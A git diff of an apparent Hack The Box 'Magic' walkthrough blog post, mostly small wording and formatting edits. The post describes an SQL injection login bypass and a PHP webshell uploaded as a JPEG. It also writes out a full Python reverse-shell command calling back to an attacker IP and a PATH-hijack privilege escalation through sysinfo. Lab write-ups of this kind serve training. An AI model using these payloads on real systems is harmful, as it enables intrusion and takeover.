@@ -8,37 +8,43 @@ math: true
 image: /assets/img/htb/Magic/magic_infocard.png
 ---
 
-<p>Let's do an NMAP scan</p>
+<p>Let's do a NMAP scan</p>
 
 <img src="/assets/img/htb/Magic/01_nmap.png">
 
 <p>
-Browsing to http://10.10.10.185 we get a page with images and on the bottom left a login to upload images
+Browsing to http://10.10.10.185 we get a page with images and on the bottom left a login to upload images.
 </p>
 
 <img src="/assets/img/htb/Magic/02_login_message.png">
 
 <p>
-We click login
+Let's click on the login link.
 </p>
 
 <img src="/assets/img/htb/Magic/03_login_blank.png">
 
 <p>
-I tried the default username and password combos but nothing.
+I tried default top 10 usernames and passwords combos but nothing.
+<br>
 Since we have no credentials to try, we can try SQL injection
-
+<br>
 username: ‘or ’1'='1
+<br>
 password: ‘or ’1'='1
 </p>
 
-<img src="/assets/img/htb/Magic/03_login_sql.png">
+<img src="/assets/img/htb/Magic/04_login_sql.png">
+
+<p>
+
+We get prompted with an upload page for images.
 
 <img src="/assets/img/htb/Magic/05_upload_img.png">
 
 <p>
 
-Seems we can upload images. Let's see what can be uploaded. Let's just click upload.
+Let's see what can be uploaded. Let's just click upload.
 
 </p>
 
@@ -47,13 +53,15 @@ Seems we can upload images. Let's see what can be uploaded. Let's just click upl
 <p>
 
 Only JPG, JPEG and PNG files are allowed.
+<br>
 Let's go for the bypassing the filter.
-
+<br>
 Let's upload a file and see where it saves it to.
+<br>
 It uploads it to the front page on the slider and when you right click to view image we can see it saves it under http://10.10.10.185/images/uploads/
-
+<br>
 Now let's do some magic
-
+<br>
 Take any JPG,JPEG or PNG inject it with some code and then rename the file.
 
 </p>
@@ -63,24 +71,23 @@ Take any JPG,JPEG or PNG inject it with some code and then rename the file.
 <p>
 
 Upload this file via the upload page
-
+<br>
 In another terminal run nc -lvnp 9991
-
+<br>
 The only payload I found to work was the python method
-
+<br>
 Now point your browser or use curl to the following URL
-
+<br>
 http://10.10.10.185/images/uploads/lordcommander.php.jpeg?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.31",9991));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 
 </p>
-
 
 <img src="/assets/img/htb/Magic/08_img_rev_shell.png">
 
 <p>
 
 We have a shell!
-
+<br>
 Let's get an interactive shell
 
 <p>
@@ -100,9 +107,10 @@ After enumerating a bit we get the following:
 <p>
 
 I tried to use the password to login via ssh and su but both failed.
-This is not the password.
-
-Let's enumumerate the database. There is no mysql client installed so the only way now is to do a mysqldump.
+<br>
+This is not the password for the user.
+<br>
+Let's enumerate the database. There is no mysql client installed so the only way now is to do a mysqldump.
 
 </p>
 
@@ -110,7 +118,7 @@ Let's enumumerate the database. There is no mysql client installed so the only w
 
 <p>
 
-We then find this in the dump: 
+We then find this in the dump:.
 
 </p>
 
@@ -119,7 +127,8 @@ We then find this in the dump:
 <p>
 
 We have some creds. Password reuse?
-let us just su to the user with the password.
+<br>
+Let us just su to the user with the password.
 
 </p>
 
@@ -129,10 +138,11 @@ let us just su to the user with the password.
 <p>
 
 user flag achieved!
-
+<br>
 Now for root.
-
+<br>
 We first have to upload some enumerating scripts.
+<br>
 I uploaded both LinEnum or LinPEAS and found this pretty interesting:
 
 </p>
@@ -142,8 +152,8 @@ I uploaded both LinEnum or LinPEAS and found this pretty interesting:
 <p> 
 
 /bin/sysinfo is executable and the user group has permissions to run it.
-
-There is another tool called pspy64 which monitors linux processes and we can use this to see what it does in the background. So we run /bin/sysinfo and monitor pspy and see the following.
+<br>
+There is another tool called pspy64 which monitors linux processes and we can use this to see what it does in the background. So we run /bin/sysinfo and monitor pspy64 and see the following.
 
 </p>
 
@@ -151,14 +161,14 @@ There is another tool called pspy64 which monitors linux processes and we can us
 
 <p>
 
-sysinfo calls a few files and seems like we can inject our own path to a custom fdisk file to maybe create a reverse shell?
-
+sysinfo calls a few files and seems like we can inject our own path to point to a custom created fdisk file to maybe create a reverse shell?
+<br>
 First in another terminal run our nc -lvnp 9994 
-
+<br>
 Back to the magic terminical and let us add /tmp into the system PATH
-
+<br>
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/bin:/usr/games:/usr/local/games:/snap/bin:/tmp
-
+<br>
 We then create a file in /tmp with the following.
 
 </p>
@@ -167,7 +177,7 @@ We then create a file in /tmp with the following.
 
 <p>
 
-Make it executable and then run /bin/sysinfo again and we watch pspy64 again.
+Make it executable and then run /bin/sysinfo again and we watch pspy64.
 
 </p>
 
@@ -175,9 +185,9 @@ Make it executable and then run /bin/sysinfo again and we watch pspy64 again.
 
 <p>
 
-You can see it has now executed our code from the fstab in the /tmp directory instead of the actually operating system's fstab!
-
-Let us pop to the terminal where we can our netcat.
+You can see it has now executed our code from the fstab script we created in the /tmp directory instead of the actual operating system's fstab!
+<br>
+Let us pop to the terminal where we can our nc.
 
 </p>
 
